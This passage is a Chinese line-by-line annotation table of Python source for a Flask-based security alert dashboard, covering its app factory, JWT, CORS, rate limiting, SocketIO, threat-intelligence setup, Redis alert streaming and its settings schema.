| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    checks = _runtime_dependency_checks(app, cfg)` |
| 125 | 条件判断：满足条件时进入对应分支。 | `    if checks["redis"]["required"] and not checks["redis"]["ok"]:` |
| 126 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 127 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "启动失败：REQUIRE_REDIS_AVAILABLE=true 且 Redis 不可用。"` |
| 128 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "请先修复 Redis 连接/鉴权后再启动。"` |
| 129 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 130 | 条件判断：满足条件时进入对应分支。 | `    if checks["models"]["required"] and not checks["models"]["ok"]:` |
| 131 | 抛出异常：主动报告不可继续的错误。 | `        raise RuntimeError(` |
| 132 | 代码语句：参与当前文件的业务流程或数据处理。 | `            "启动失败：REQUIRE_MODELS_READY=true 且模型文件缺失。"` |
| 133 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            f"missing={checks['models']['missing']}"` |
| 134 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 135 | 返回结果：把处理后的值交回调用方。 | `    return checks` |
| 136 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 137 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 138 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 139 | 注释：解释下面或当前这段代码的设计意图。 | `# 应用工厂` |
| 140 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 141 | 函数定义：声明 `create_app` 的输入、处理逻辑和返回结果。 | `def create_app() -> tuple[Flask, SocketIO]:` |
| 142 | 文档字符串：说明当前模块、类或函数的职责。 | `    """构建并返回 (Flask, SocketIO) 实例对。` |
| 143 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 144 | 代码语句：参与当前文件的业务流程或数据处理。 | `    使用工厂模式便于测试注入不同配置。` |
| 145 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cfg = get_config()` |
| 147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app = Flask(` |
| 149 | 代码语句：参与当前文件的业务流程或数据处理。 | `        __name__,` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        template_folder="templates",` |
| 151 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        static_folder="static",` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        static_url_path="/static",` |
| 153 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 154 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 155 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 核心配置 ----------------------------------------------------` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["SECRET_KEY"] = cfg.SECRET_KEY` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["JWT_SECRET_KEY"] = cfg.SECRET_KEY` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["JWT_ACCESS_TOKEN_EXPIRES"] = cfg.JWT_TOKEN_EXPIRES` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["JWT_REFRESH_TOKEN_EXPIRES"] = cfg.JWT_REFRESH_TOKEN_EXPIRES` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["SQLALCHEMY_DATABASE_URI"] = cfg.SQLALCHEMY_DATABASE_URI` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = cfg.SQLALCHEMY_TRACK_MODIFICATIONS` |
| 162 | 注释：解释下面或当前这段代码的设计意图。 | `    # 生产环境关闭 debug（由 config 控制）` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["DEBUG"] = getattr(cfg, "DEBUG", False)` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["MODEL_DIR"] = getattr(cfg, "MODEL_DIR", "models/saved")` |
| 165 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["GUARDIAN_LOG_DIR"] = getattr(cfg, "LOG_DIR", "logs")` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.config["LOG_INTEGRITY_ENABLED"] = getattr(` |
| 167 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg, "LOG_INTEGRITY_ENABLED", True` |
| 168 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 169 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["guardian_os_config"] = cfg` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `    db.init_app(app)` |
| 171 | 函数调用：执行已有函数/方法完成当前步骤。 | `    init_db_tables(app)` |
| 172 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 173 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- JWT ---------------------------------------------------------` |
| 174 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    jwt = JWTManager(app)` |
| 175 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _register_jwt_error_handlers(jwt)` |
| 176 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 177 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- CORS（严格白名单）-------------------------------------------` |
| 178 | 函数调用：执行已有函数/方法完成当前步骤。 | `    CORS(` |
| 179 | 代码语句：参与当前文件的业务流程或数据处理。 | `        app,` |
| 180 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        resources={` |
| 181 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            r"/api/*": {` |
| 182 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "origins": cfg.ALLOWED_ORIGINS,` |
| 183 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "methods": ["GET", "POST", "PUT", "DELETE", "OPTIONS"],` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "allow_headers": ["Content-Type", "Authorization"],` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "supports_credentials": False,` |
| 186 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 187 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 188 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 189 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 190 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 速率限制 ----------------------------------------------------` |
| 191 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    limiter = Limiter(` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        app=app,` |
| 193 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key_func=get_remote_address,` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        default_limits=[cfg.API_RATE_LIMIT],` |
| 195 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        storage_uri="memory://",` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        strategy="fixed-window",` |
| 197 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 198 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 199 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- WebSocket ---------------------------------------------------` |
| 200 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    socketio = SocketIO(` |
| 201 | 代码语句：参与当前文件的业务流程或数据处理。 | `        app,` |
| 202 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cors_allowed_origins=cfg.ALLOWED_ORIGINS,` |
| 203 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        async_mode="threading",` |
| 204 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ping_interval=25,` |
| 205 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ping_timeout=20,` |
| 206 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 207 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 208 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 业务状态 ----------------------------------------------------` |
| 209 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state = _ServerState()` |
| 210 | 函数调用：执行已有函数/方法完成当前步骤。 | `    state.init_settings(_default_editable_settings())` |
| 211 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 212 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _hydrate_settings_from_db(state)` |
| 213 | 函数调用：执行已有函数/方法完成当前步骤。 | `        _sync_banned_cache_from_db(state)` |
| 214 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["guardian_state"] = state` |
| 215 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["guardian_socketio"] = socketio` |
| 216 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 217 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 威胁情报采集器 ---------------------------------------------` |
| 218 | 注释：解释下面或当前这段代码的设计意图。 | `    # 从环境变量读 Key；缺失不影响应用启动，仅影响对应 provider 的查询。` |
| 219 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    threat_intel = ThreatIntelCollector(` |
| 220 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        abuseipdb_key=os.environ.get("ABUSEIPDB_API_KEY", ""),` |
| 221 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        virustotal_key=os.environ.get("VIRUSTOTAL_API_KEY", ""),` |
| 222 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        external_http_timeout=float(os.environ.get("THREAT_INTEL_HTTP_TIMEOUT", "5")),` |
| 223 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        external_wait_sec=float(os.environ.get("THREAT_INTEL_EXTERNAL_WAIT_SEC", "0.45")),` |
| 224 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 225 | 函数调用：执行已有函数/方法完成当前步骤。 | `    threat_intel.bind_flask_app(app)` |
| 226 | 上下文管理：自动管理资源打开与释放。 | `    with app.app_context():` |
| 227 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 228 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            _n = threat_intel.refresh_local_from_db()` |
| 229 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.info("[Phase7] 威胁情报 IOC 已从 DB 加载 %d 条", _n)` |
| 230 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 231 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[Phase7] 威胁情报 DB 初始加载跳过: %s", exc)` |
| 232 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["guardian_threat_intel"] = threat_intel` |
| 233 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 234 | 注释：解释下面或当前这段代码的设计意图。 | `    # ---- 路由注册 ----------------------------------------------------` |
| 235 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _register_page_routes(app)` |
| 236 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _register_api_routes(app, limiter, state)` |
| 237 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.observability_routes import register_observability_routes` |
| 238 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 239 | 函数调用：执行已有函数/方法完成当前步骤。 | `    register_observability_routes(app, limiter)` |
| 240 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _register_socket_handlers(socketio, state)` |
| 241 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _register_common_error_handlers(app)` |
| 242 | 函数调用：执行已有函数/方法完成当前步骤。 | `    _register_access_log_writer(app)` |
| 243 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 244 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["guardian_alert_consumer"] = None` |
| 245 | 条件判断：满足条件时进入对应分支。 | `    if getattr(cfg, "ALERT_STREAM_CONSUMER_AUTOSTART", True):` |
| 246 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 247 | 导入对象：从指定模块引入类、函数或常量。 | `            from src.utils.redis_client import RedisClient` |
| 248 | 导入对象：从指定模块引入类、函数或常量。 | `            from web.alert_stream_consumer import GuardianAlertStreamConsumer` |
| 249 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 250 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            _redis_client = RedisClient(` |
| 251 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                host=cfg.REDIS_HOST,` |
| 252 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                port=cfg.REDIS_PORT,` |
| 253 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                db=cfg.REDIS_DB,` |
| 254 | 占位语句：保持语法完整但当前不执行操作。 | `                password=getattr(cfg, "REDIS_PASSWORD", "") or "",` |
| 255 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 256 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            _consumer = GuardianAlertStreamConsumer(` |
| 257 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                app=app,` |
| 258 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                redis_client=_redis_client,` |
| 259 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                socketio=socketio,` |
| 260 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                stream_key=getattr(cfg, "GUARDIAN_ALERT_STREAM", "guardian:alerts"),` |
| 261 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                group_name=getattr(cfg, "GUARDIAN_ALERT_STREAM_GROUP", "guardian:web"),` |
| 262 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                normalizer=normalize_guardian_stream_fields,` |
| 263 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                upsert_alert=_upsert_alert_to_db,` |
| 264 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                alert_to_api_dict=_alert_to_api_dict,` |
| 265 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 266 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _consumer.start()` |
| 267 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            app.extensions["guardian_alert_consumer"] = _consumer` |
| 268 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 269 | 函数定义：声明 `_stop_alert_consumer` 的输入、处理逻辑和返回结果。 | `            def _stop_alert_consumer() -> None:` |
| 270 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                c = app.extensions.get("guardian_alert_consumer")` |
| 271 | 条件判断：满足条件时进入对应分支。 | `                if c is not None:` |
| 272 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    c.stop()` |
| 273 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 274 | 函数调用：执行已有函数/方法完成当前步骤。 | `            atexit.register(_stop_alert_consumer)` |
| 275 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 276 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.warning("[Phase7] Redis Stream 告警 consumer 未启动: %s", exc)` |
| 277 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 278 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logger.info(` |
| 279 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "[Phase7] Flask app 就绪: ALLOWED_ORIGINS=%s, rate_limit=%s",` |
| 280 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.ALLOWED_ORIGINS,` |
| 281 | 代码语句：参与当前文件的业务流程或数据处理。 | `        cfg.API_RATE_LIMIT,` |
| 282 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 283 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 284 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 285 | 导入对象：从指定模块引入类、函数或常量。 | `        from web.audit_integrity_patrol import (` |
| 286 | 代码语句：参与当前文件的业务流程或数据处理。 | `            run_audit_integrity_patrol_once,` |
| 287 | 代码语句：参与当前文件的业务流程或数据处理。 | `            start_audit_integrity_patrol,` |
| 288 | 代码语句：参与当前文件的业务流程或数据处理。 | `            stop_audit_integrity_patrol,` |
| 289 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 290 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 291 | 上下文管理：自动管理资源打开与释放。 | `        with app.app_context():` |
| 292 | 函数调用：执行已有函数/方法完成当前步骤。 | `            run_audit_integrity_patrol_once(app)` |
| 293 | 函数调用：执行已有函数/方法完成当前步骤。 | `        start_audit_integrity_patrol(app)` |
| 294 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        atexit.register(lambda: stop_audit_integrity_patrol(app))` |
| 295 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 296 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning("[Phase7] 审计完整性巡检未启动: %s", exc)` |
| 297 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 298 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    checks = _enforce_startup_guards(app, cfg)` |
| 299 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    app.extensions["guardian_startup_dependency_checks"] = checks` |
| 300 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 301 | 返回结果：把处理后的值交回调用方。 | `    return app, socketio` |
| 302 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 303 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 304 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 305 | 注释：解释下面或当前这段代码的设计意图。 | `# 内存业务状态（开发缓存/兼容层；生产真源为 DB）` |
| 306 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 307 | 注释：解释下面或当前这段代码的设计意图。 | `#: 合法等级（DESIGN §2.3 威胁等级色）` |
| 308 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ALERT_LEVELS: Tuple[str, ...] = ("low", "medium", "high", "critical")` |
| 309 | 注释：解释下面或当前这段代码的设计意图。 | `#: 合法状态流：open → acknowledged → resolved；任何状态可 → ignored` |
| 310 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `ALERT_STATUSES: Tuple[str, ...] = ("open", "acknowledged", "resolved", "ignored")` |
| 311 | 注释：解释下面或当前这段代码的设计意图。 | `#: 检测规则类型` |
| 312 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `RULE_TYPES: Tuple[str, ...] = ("signature", "anomaly", "threshold")` |
| 313 | 注释：解释下面或当前这段代码的设计意图。 | `#: 规则命中后的处置动作` |
| 314 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `RULE_ACTIONS: Tuple[str, ...] = ("alert", "block", "monitor")` |
| 315 | 注释：解释下面或当前这段代码的设计意图。 | `#: 规则 pattern 的最大长度，防止滥用` |
| 316 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_RULE_PATTERN_MAX: int = 1024` |
| 317 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_RULE_NAME_MAX: int = 80` |
| 318 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_RULE_DESC_MAX: int = 400` |
| 319 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 320 | 注释：解释下面或当前这段代码的设计意图。 | `#: 审计报告的周期枚举（DESIGN §8.6 支持日/周/月）` |
| 321 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `REPORT_PERIODS: Tuple[str, ...] = ("day", "week", "month")` |
| 322 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 323 | 注释：解释下面或当前这段代码的设计意图。 | `#: 设置里可写字段的 schema（前端渲染 + 后端校验的单一真源）` |
| 324 | 注释：解释下面或当前这段代码的设计意图。 | `# 字段：type=float\|bool\|string\|email\|url；min/max/step/pattern 用于约束；label/hint 驱动 UI。` |
| 325 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `SETTINGS_SCHEMA: Dict[str, Dict[str, Any]] = {` |
| 326 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "detection_sensitivity": {` |
| 327 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "float",` |
| 328 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "min": 0.0,` |
| 329 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "max": 1.0,` |
| 330 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "step": 0.01,` |
| 331 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "label": "检测灵敏度",` |
| 332 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "group": "detection",` |
| 333 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hint": "模型倾向于更多告警（高灵敏度）还是更少误报（低灵敏度）。建议 0.5~0.85。",` |
| 334 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 335 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "alert_threshold": {` |
| 336 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "float",` |
| 337 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "min": 0.0,` |
| 338 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "max": 1.0,` |
| 339 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "step": 0.01,` |
| 340 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "label": "告警触发阈值",` |
| 341 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "group": "detection",` |
| 342 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hint": "预测置信度低于此值将被丢弃。应 ≤ 检测灵敏度。",` |
| 343 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 344 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "alert_email": {` |
| 345 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "email",` |
| 346 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "label": "告警邮箱",` |
| 347 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "group": "notifications",` |
| 348 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hint": "Phase 8 起启用；Phase 7 暂仅做格式校验与配置落盘。",` |
| 349 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "placeholder": "soc@example.com",` |
| 350 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "optional": True,` |
| 351 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 352 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "alert_webhook": {` |
| 353 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "url",` |
| 354 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "label": "告警 Webhook",` |
| 355 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "group": "notifications",` |
| 356 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hint": "严重告警将以 JSON POST 到此地址；仅允许 http(s) 协议。",` |
| 357 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "placeholder": "https://hooks.example.com/soc",` |
| 358 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "optional": True,` |
| 359 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 360 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "model_version": {` |
| 361 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "string",` |
| 362 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "label": "当前模型版本",` |
| 363 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "group": "model",` |
| 364 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "pattern": r"^v\d+(?:\.\d+){0,2}$",` |
| 365 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hint": "格式：v1 / v1.2 / v1.2.3。影响 /api/reports 中 model_performance.version。",` |
| 366 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 367 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "model_hot_reload": {` |
| 368 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "type": "bool",` |
| 369 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "label": "开启模型热更新",` |
| 370 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "group": "model",` |
| 371 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "hint": "启用后 Phase 8 检测引擎会在模型文件变更时自动重载。",` |
| 372 | 代码语句：参与当前文件的业务流程或数据处理。 | `    },` |
| 373 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 374 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `SETTINGS_EDITABLE_KEYS: Tuple[str, ...] = tuple(SETTINGS_SCHEMA.keys())` |
| 375 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 376 | 注释：解释下面或当前这段代码的设计意图。 | `#: 威胁情报 IOC 类型` |
| 377 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `IOC_TYPES: Tuple[str, ...] = ("ip", "domain", "url", "file_hash", "cve")` |
| 378 | 注释：解释下面或当前这段代码的设计意图。 | `#: 支持的情报源 provider（占位源未配置时 API 返回 not_configured）` |
| 379 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DEFAULT_PROVIDERS: Tuple[str, ...] = (` |
| 380 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "local",` |
| 381 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "abuseipdb",` |
| 382 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "virustotal",` |
| 383 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "spamhaus",` |
| 384 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "phishtank",` |
| 385 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "openphish",` |
| 386 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "nvd",` |
| 387 | 代码语句：参与当前文件的业务流程或数据处理。 | `    "cnvd",` |
| 388 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 389 | 注释：解释下面或当前这段代码的设计意图。 | `#: 域名合法性校验（与 collector 一致）` |
| 390 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_DOMAIN_RE = re.compile(` |
| 391 | 函数调用：执行已有函数/方法完成当前步骤。 | `    r"^(?=.{1,253}$)(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$"` |
| 392 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 393 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_HASH_RE = re.compile(r"^[a-f0-9]{32,128}$", re.IGNORECASE)` |
| 394 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_CVE_RE = re.compile(r"^CVE-\d{4}-\d{4,}$", re.IGNORECASE)` |
| 395 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 396 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 397 | 类定义：声明 `_ServerState`，封装相关状态与行为。 | `class _ServerState:` |
| 398 | 文档字符串：说明当前模块、类或函数的职责。 | `    """进程内缓存的运行时状态。"""` |
| 399 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 400 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    _MAX_ALERTS: int = 500` |
| 401 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 402 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self) -> None:` |
| 403 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._alerts: Deque[Dict[str, Any]] = deque(maxlen=self._MAX_ALERTS)` |
| 404 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._by_id: Dict[str, Dict[str, Any]] = {}` |
